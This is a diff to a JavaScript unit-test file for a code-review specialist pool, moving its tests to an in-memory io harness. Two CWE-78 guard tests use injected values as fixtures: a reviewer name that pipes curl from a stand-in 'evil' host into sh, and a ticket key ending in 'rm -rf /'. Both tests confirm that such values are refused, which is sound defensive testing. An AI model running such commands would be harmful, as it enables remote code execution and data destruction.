@@ -9,16 +9,22 @@
  * and readSpecialistOutcomes (the post action's file-view, same selection).
  * Fail-open semantics: timeout/crash/invalid/stale candidates all degrade
  * to `unavailable` without throwing.
+ *
+ * Runs under the documented dmtools runner (loadModule/makeRequire + the
+ * injected assert — see js/unit-tests/testRunner.js): the candidates/
+ * coverage fixtures live in the module's memoryIo map, so no Node builtins
+ * (fs/path/os) are touched (the review IMPORTANT: the Node-idiom file reds
+ * `dmtools run js/unit-tests/run_reviewPoolExecution.json`).
  */
 'use strict';
 
-var assert = require('assert');
-var path = require('path');
-var os = require('os');
-var fs = require('fs');
+// loadModule/makeRequire/assert are the harness globals (see testRunner.js);
+// the require closure of reviewPoolInJob.js resolves for real through
+// REAL_COMMON_MODULES (reviewPoolCandidates/reviewPool/reviewPolicy/
+// reviewVerdicts are all pure).
 
-var inJob = require(path.resolve(__dirname, '../common/reviewPoolInJob.js'));
-var candidatesModule = require(path.resolve(__dirname, '../common/reviewPoolCandidates.js'));
+var inJob = loadModule('js/common/reviewPoolInJob.js', makeRequire({}), {});
+var candidatesModule = loadModule('js/common/reviewPoolCandidates.js', makeRequire({}), {});
 
 
 var HEAD = 'aaaabbbbccccddddeeeeffff0000111122223333';
@@ -49,21 +55,45 @@ var ctxOf = function(overrides) {
     }, overrides || {});
 };
 
+/** In-memory io + the executed-command log — the harness port of the
+ * former tmpdir io: the candidates/coverage files ride the io map. */
+function recorder() {
+    var executed = [];
+    var io = inJob.memoryIo({}, function() {});
+    return { io: io, executed: executed };
+}
+
+function candidatesFile(io, reviewer, head, findings) {
+    io.writeFile(inJob.candidatesPathOf(reviewer), JSON.stringify({
+        reviewer: reviewer, head: head,
+        candidates: findings || [],
+        count: (findings || []).length, truncated: false,
+        at: '2026-11-13T00:00:00Z'
+    }));
+}
+
+function coverageFile(io, reviewer, head, covered, pending) {
+    io.writeFile(inJob.coveragePathOf(reviewer), JSON.stringify({
+        reviewer: reviewer, head: head, covered: covered,
+        pending: pending, truncated: false, at: '2026-11-13T00:00:00Z'
+    }));
+}
+
 
 // ── selection ────────────────────────────────────────────────────────────────
 
 test('selection: enabled reviewers only', function() {
     var pool = poolOf([skillOf('general'), skillOf('off', { isEnabled: false })]);
     var got = inJob.selectSpecialists(pool, ctxOf());
-    assert.deepStrictEqual(got.map(function(s) { return s.name; }), ['general']);
+    assert.deepEqual(got.map(function(s) { return s.name; }), ['general']);
 });
 
 test('selection: rounds scope excludes the specialist on a first round', function() {
     var pool = poolOf([skillOf('general'), skillOf('hunksOnly', { rounds: ['hunks'] })]);
     var got = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false }));
-    assert.deepStrictEqual(got.map(function(s) { return s.name; }), ['general']);
+    assert.deepEqual(got.map(function(s) { return s.name; }), ['general']);
     var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
-    assert.deepStrictEqual(hunks.map(function(s) { return s.name; }), ['general', 'hunksOnly']);
+    assert.deepEqual(hunks.map(function(s) { return s.name; }), ['general', 'hunksOnly']);
 });
 
 test('selection: triggerPaths gate hunks-only reviewers; first-rounds reviewers run every pass', function() {
@@ -77,10 +107,10 @@ test('selection: triggerPaths gate hunks-only reviewers; first-rounds reviewers 
     // a run): triggerPaths gate the HUNKS flag only — a first-rounds reviewer
     // runs on every pass; a hunks-only reviewer runs when its paths hit.
     var first = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false, newHunkPaths: [] }));
-    assert.deepStrictEqual(first.map(function(s) { return s.name; }),
+    assert.deepEqual(first.map(function(s) { return s.name; }),
         ['general', 'scoped'], 'a first pass runs the first-rounds reviewers');
     var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/dep/file.js'] }));
-    assert.deepStrictEqual(hunks.map(function(s) { return s.name; }),
+    assert.deepEqual(hunks.map(function(s) { return s.name; }),
         ['general', 'scoped', 'jsOnlyHunks'], 'the hunks round scopes hunks-only reviewers by triggerPaths');
 });
 
@@ -89,9 +119,9 @@ test('the CWE-78 guard: a hostile reviewer name never composes a spawn command',
     var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
     var pool = poolOf([skillOf('x; curl evil|sh')]);
     var round = inJob.runSpecialists(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
-    assert.deepStrictEqual(round.completed, [], 'nothing completed');
-    assert.deepStrictEqual(spawned, [], 'NO command was built');
-    assert.strictEqual(round.unavailable[0], 'x; curl evil|sh');
+    assert.deepEqual(round.completed, [], 'nothing completed');
+    assert.deepEqual(spawned, [], 'NO command was built');
+    assert.equal(round.unavailable[0], 'x; curl evil|sh');
     assert.ok(round.results[0].reason.indexOf('unsafe identifier') === 0,
         'the guard reason names the refusal');
 });
@@ -101,8 +131,8 @@ test('the CWE-78 guard: a hostile ticket key is refused the same way', function(
     var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
     var pool = poolOf([skillOf('security')]);
     var round = inJob.runSpecialists(io, pool, ctxOf({ ticketKey: 'gh-1"; rm -rf /', hasNewHunks: true }));
-    assert.deepStrictEqual(spawned, [], 'NO command built for a hostile ticket key');
-    assert.deepStrictEqual(round.unavailable, ['security']);
+    assert.deepEqual(spawned, [], 'NO command built for a hostile ticket key');
+    assert.deepEqual(round.unavailable, ['security']);
 });
 
 test('the batch command: parallel spawn, per-child caps, the outer round-budget cap', function() {
@@ -132,8 +162,8 @@ test('prompt: the incremental + partial-write discipline (truncated flag)', func
 });
 
 test('roundTypeOf: first vs hunks', function() {
-    assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: false })), 'first');
-    assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: true })), 'hunks');
+    assert.equal(inJob.roundTypeOf(ctxOf({ hasNewHunks: false })), 'first');
+    assert.equal(inJob.roundTypeOf(ctxOf({ hasNewHunks: true })), 'hunks');
 });
 
 // ── prompt contract ──────────────────────────────────────────────────────────
@@ -165,123 +195,74 @@ test('command: the default timeout applies on garbage input', function() {
 
 // ── runSpecialists: execution + outcome split ────────────────────────────────
 
-function recordingIo(outcomes) {
-    var executed = [];
-    var dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pool-injob-'));
-    return {
-        io: {
-            executeCommand: function(command) {
-                executed.push(command);
-                var write = outcomes[executed.length - 1];
-                if (typeof write === 'function') write(dir);
-            },
-            writeFile: function(p, content) {
-                fs.mkdirSync(path.dirname(path.join(dir, p)), { recursive: true });
-                fs.writeFileSync(path.join(dir, p), content);
-            },
-            readFile: function(p) {
-                try {
-                    return fs.readFileSync(path.join(dir, p), 'utf8');
-                } catch (e) {
-                    return null;
-                }
-            },
-            nowIso: function() { return '2026-11-13T00:00:00Z'; }
-        },
-        executed: executed,
-        dir: dir
-    };
-}
-
-function candidatesFile(dir, reviewer, head, findings) {
-    fs.mkdirSync(path.join(dir, 'outputs'), { recursive: true });
-    var payload = {
-        reviewer: reviewer, head: head,
-        candidates: findings || [],
-        count: (findings || []).length, truncated: false,
-        at: '2026-11-13T00:00:00Z'
-    };
-    fs.writeFileSync(path.join(dir, inJob.candidatesPathOf(reviewer)),
-        JSON.stringify(payload));
-}
-
-function coverageFile(dir, reviewer, head, covered, pending) {
-    fs.mkdirSync(path.join(dir, 'outputs'), { recursive: true });
-    fs.writeFileSync(path.join(dir, inJob.coveragePathOf(reviewer)),
-        JSON.stringify({ reviewer: reviewer, head: head, covered: covered,
-            pending: pending, truncated: false, at: '2026-11-13T00:00:00Z' }));
-}
-
 var pool = poolOf([skillOf('general'), skillOf('security'), skillOf('flaky')]);
 // NOTE: 'base' (the posting reviewer) is excluded from the specialists by
 // design — these fixtures use 'general' as a non-posting specialist name.
 
 test('runSpecialists: completed vs unavailable, validated candidates only (batch)', function() {
-    var t = recordingIo([]);
+    var t = recorder();
     var spawnedPrompts = [];
     t.io.executeCommand = function(command) {
         t.executed.push(command);
         // The composite spawns every prompt; only security lands a valid file.
         (command.match(/pool_specialist-[a-z]+\.md/g) || []).forEach(function(p) { spawnedPrompts.push(p); });
-        candidatesFile(t.dir, 'security', HEAD, []);
+        candidatesFile(t.io, 'security', HEAD, []);
     };
     var round = inJob.runSpecialists(t.io, pool, ctxOf());
-    assert.strictEqual(t.executed.length, 1, 'ONE composite command per round');
-    assert.strictEqual(spawnedPrompts.length, 3, 'every specialist spawns (parallel)');
-    assert.deepStrictEqual(round.completed, ['security']);
-    assert.deepStrictEqual(round.unavailable, ['general', 'flaky']);
-    assert.strictEqual(round.candidates.length, 1);
-    assert.strictEqual(round.candidates[0].reviewer, 'security');
-    assert.strictEqual(round.candidates[0].count, 0);
+    assert.equal(t.executed.length, 1, 'ONE composite command per round');
+    assert.equal(spawnedPrompts.length, 3, 'every specialist spawns (parallel)');
+    assert.deepEqual(round.completed, ['security']);
+    assert.deepEqual(round.unavailable, ['general', 'flaky']);
+    assert.equal(round.candidates.length, 1);
+    assert.equal(round.candidates[0].reviewer, 'security');
+    assert.equal(round.candidates[0].count, 0);
 });
 test('runSpecialists: stale candidates (wrong head) are unavailable', function() {
-    var t = recordingIo([]);
+    var t = recorder();
     t.io.executeCommand = function(command) {
         t.executed.push(command);
-        candidatesFile(t.dir, 'security', STALE, []);
+        candidatesFile(t.io, 'security', STALE, []);
     };
     var round = inJob.runSpecialists(t.io, pool, ctxOf());
-    assert.deepStrictEqual(round.completed, []);
-    assert.strictEqual(round.unavailable.indexOf('security') !== -1, true);
+    assert.deepEqual(round.completed, []);
+    assert.ok(round.unavailable.indexOf('security') !== -1, 'security is unavailable');
 });
 test('runSpecialists: an invalid record degrades to unavailable (no throw)', function() {
-    var t = recordingIo([]);
+    var t = recorder();
     t.io.executeCommand = function(command) {
         t.executed.push(command);
-        fs.mkdirSync(path.join(t.dir, 'outputs'), { recursive: true });
-        fs.writeFileSync(path.join(t.dir, inJob.candidatesPathOf('security')),
-            '{"nope": true}');
+        t.io.writeFile(inJob.candidatesPathOf('security'), '{"nope": true}');
     };
     var round = inJob.runSpecialists(t.io, pool, ctxOf());
-    assert.deepStrictEqual(round.completed, []);
+    assert.deepEqual(round.completed, []);
     var sec = round.results.filter(function(r) { return r.reviewer === 'security'; })[0];
     assert.ok(sec && sec.reason && sec.reason.indexOf('invalid candidates record') !== -1);
 });
 
 test('runSpecialists: the composite throwing degrades EVERYTHING (fail-open, no throw)', function() {
-    var t = recordingIo([]);
+    var t = recorder();
     t.io.executeCommand = function(command) {
         t.executed.push(command);
         throw new Error('timeout -k 60 1800 …');
     };
     var round = inJob.runSpecialists(t.io, pool, ctxOf());
-    assert.deepStrictEqual(round.completed, []);
-    assert.strictEqual(round.unavailable.length, 3);
+    assert.deepEqual(round.completed, []);
+    assert.equal(round.unavailable.length, 3);
     assert.ok(round.results.every(function(r) { return !r.ok; }), 'every result is unavailable');
 });
 
 test('runSpecialists: a killed specialist with coverage memory notes the continuation', function() {
-    var t = recordingIo([]);
+    var t = recorder();
     t.io.executeCommand = function(command) {
         t.executed.push(command);
         // The child died mid-pass but its coverage file landed (the
         // incremental-write discipline).
-        coverageFile(t.dir, 'security', HEAD, ['js/x.js'], ['js/y.js']);
+        coverageFile(t.io, 'security', HEAD, ['js/x.js'], ['js/y.js']);
     };
     var round = inJob.runSpecialists(t.io, pool, ctxOf());
-    assert.deepStrictEqual(round.completed, []);
-    assert.strictEqual(round.coverageNotes.length, 1, 'the continuation note exists');
-    assert.strictEqual(round.coverageNotes[0].reviewer, 'security');
+    assert.deepEqual(round.completed, []);
+    assert.equal(round.coverageNotes.length, 1, 'the continuation note exists');
+    assert.equal(round.coverageNotes[0].reviewer, 'security');
     assert.ok(round.coverageNotes[0].text.indexOf('covered 1, pending 1') !== -1,
         'the note carries the counts');
 });
@@ -301,7 +282,7 @@ test('the round budget default is 1800s — it MUST exceed the per-specialist 90
     // The review IMPORTANT: the shipped 180 default (3 minutes) killed the
     // batch before any 900s specialist could finish — the pool no-op'd every
     // round. The units bug is pinned by this test.
-    assert.strictEqual(inJob.DEFAULT_ROUND_BUDGET_SECONDS, 1800,
+    assert.equal(inJob.DEFAULT_ROUND_BUDGET_SECONDS, 1800,
         '30 minutes, strictly greater than the per-specialist 900s cap');
     var cmd = inJob.buildBatchCommand(['input/t/pool_specialist-security.md'], null, null);
     assert.ok(cmd.indexOf('timeout -k 60 1800') !== -1, 'the defaults apply to the command');
@@ -310,18 +291,13 @@ test('the round budget default is 1800s — it MUST exceed the per-specialist 90
 test('readSpecialistOutcomes: no continuation note for a specialist that delivered candidates', function() {
     // The review IMPORTANT: the coverage note fired for COMPLETED specialists
     // (a lying "no candidates" note while the candidates were accepted).
-    var dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pool-cov-'));
-    candidatesFile(dir, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
-    coverageFile(dir, 'security', HEAD, ['js/x.js'], []);
-    var io = {
-        readFile: function(p) {
-            try { return fs.readFileSync(path.join(dir, p), 'utf8'); } catch (e) { return null; }
-        }
-    };
+    var io = inJob.memoryIo({});
+    candidatesFile(io, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
+    coverageFile(io, 'security', HEAD, ['js/x.js'], []);
     var pool = poolOf([skillOf('security')]);
     var out = inJob.readSpecialistOutcomes(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
-    assert.deepStrictEqual(out.completed, ['security']);
-    assert.deepStrictEqual(out.coverageNotes, [], 'a completed specialist gets NO continuation note');
+    assert.deepEqual(out.completed, ['security']);
+    assert.deepEqual(out.coverageNotes, [], 'a completed specialist gets NO continuation note');
 });
 
 test('prompt: the coverage file contract (plan-first) + the previous-pass memory', function() {
@@ -340,77 +316,62 @@ test('prompt: the coverage file contract (plan-first) + the previous-pass memory
 // ── readSpecialistOutcomes: the post action's file-view ─────────────────────
 
 test('readSpecialistOutcomes: same selection, file-driven outcomes', function() {
-    var t = recordingIo([]);
-    candidatesFile(t.dir, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
-    var io = {
-        readFile: function(p) {
-            try {
-                return fs.readFileSync(path.join(t.dir, p), 'utf8');
-            } catch (e) {
-                return null;
-            }
-        }
-    };
-    var out = inJob.readSpecialistOutcomes(io, pool, ctxOf());
-    assert.deepStrictEqual(out.completed, ['security']);
-    assert.deepStrictEqual(out.unavailable, ['general', 'flaky']);
-    assert.strictEqual(out.candidates[0].candidates[0].path, 'js/y.js');
+    var t = recorder();
+    candidatesFile(t.io, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
+    var out = inJob.readSpecialistOutcomes(t.io, pool, ctxOf());
+    assert.deepEqual(out.completed, ['security']);
+    assert.deepEqual(out.unavailable, ['general', 'flaky']);
+    assert.equal(out.candidates[0].candidates[0].path, 'js/y.js');
     // The record validates through the gh-1406 contract unchanged:
     assert.ok(candidatesModule.candidatesRecordFromPayload(out.candidates[0]));
 });
 
 test('readSpecialistOutcomes: every specialist unavailable on an empty workspace', function() {
-    var out = inJob.readSpecialistOutcomes({ readFile: function() { return null; } }, pool, ctxOf());
-    assert.deepStrictEqual(out.completed, []);
-    assert.strictEqual(out.unavailable.length, 3);
+    var out = inJob.readSpecialistOutcomes(inJob.memoryIo({}), pool, ctxOf());
+    assert.deepEqual(out.completed, []);
+    assert.equal(out.unavailable.length, 3);
 });
 
 
 suite('readCoverage — the coverage-file shape contract (reject paths are NO memory)', function() {
     function ioWith(payload) {
-        return inJob.memoryIo(inJob.coveragePathOf('security'), payload);
-    }
-
-    function memoryIo_(file, content) {
         var files = {};
-        files[file] = content;
-        return { readFile: function(p) { return Object.prototype.hasOwnProperty.call(files, p) ? files[p] : null; } };
+        files[inJob.coveragePathOf('security')] = payload;
+        return inJob.memoryIo(files);
     }
 
     test('a well-formed coverage file round-trips (head/covered/pending/truncated)', function() {
-        var io = memoryIo_(inJob.coveragePathOf('security'), JSON.stringify({
+        var cov = inJob.readCoverage(ioWith(JSON.stringify({
             reviewer: 'security', head: 'abc', covered: ['a.js'], pending: ['b.js', 42], truncated: true, at: 't'
-        }));
-        var cov = inJob.readCoverage(io, 'security');
+        })), 'security');
         assert.equal(cov.head, 'abc');
-        assert.deepStrictEqual(cov.covered, ['a.js']);
-        assert.deepStrictEqual(cov.pending, ['b.js', '42'], 'entries normalize to strings');
+        assert.deepEqual(cov.covered, ['a.js']);
+        assert.deepEqual(cov.pending, ['b.js', '42'], 'entries normalize to strings');
         assert.equal(cov.truncated, true);
     });
 
     test('garbage JSON is no memory (fail-open, never a throw)', function() {
-        assert.equal(inJob.readCoverage(memoryIo_(inJob.coveragePathOf('security'), '{nope'), 'security'), null);
+        assert.equal(inJob.readCoverage(ioWith('{nope'), 'security'), null);
     });
 
     test('another reviewer\'s file is no memory', function() {
-        var io = memoryIo_(inJob.coveragePathOf('security'), JSON.stringify({
+        var io = ioWith(JSON.stringify({
             reviewer: 'legal', head: 'abc', covered: ['a.js'], pending: []
         }));
         assert.equal(inJob.readCoverage(io, 'security'), null);
     });
 
     test('missing covered/pending arrays are no memory', function() {
-        var io = memoryIo_(inJob.coveragePathOf('security'), JSON.stringify({ reviewer: 'security', head: 'abc' }));
-        assert.equal(inJob.readCoverage(io, 'security'), null);
-        var io2 = memoryIo_(inJob.coveragePathOf('security'), JSON.stringify({
+        assert.equal(inJob.readCoverage(ioWith(JSON.stringify({ reviewer: 'security', head: 'abc' })), 'security'), null);
+        var io2 = ioWith(JSON.stringify({
             reviewer: 'security', head: 'abc', covered: 'a.js'
         }));
         assert.equal(inJob.readCoverage(io2, 'security'), null);
     });
 
     test('a non-object payload is no memory; an absent file is no memory; a throwing reader is no memory', function() {
-        assert.equal(inJob.readCoverage(memoryIo_(inJob.coveragePathOf('security'), '"[]"'), 'security'), null);
-        assert.equal(inJob.readCoverage(memoryIo_(inJob.coveragePathOf('security'), ''), 'security'), null);
+        assert.equal(inJob.readCoverage(ioWith('"[]"'), 'security'), null);
+        assert.equal(inJob.readCoverage(ioWith(''), 'security'), null);
         assert.equal(inJob.readCoverage({ readFile: function() { throw new Error('boom'); } }, 'security'), null);
     });
 });
